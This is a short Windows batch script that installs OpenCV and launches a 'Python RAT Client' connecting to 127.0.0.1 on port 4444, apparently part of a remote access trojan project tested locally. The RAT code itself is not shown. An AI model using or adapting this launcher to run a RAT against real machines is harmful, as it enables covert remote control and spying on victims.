@echo off
echo Installing OpenCV if needed...
venv\Scripts\activate
pip install opencv-python --quiet

echo Starting Python RAT Client...
cd Client
python Client.py --host 127.0.0.1 --port 4444

pause 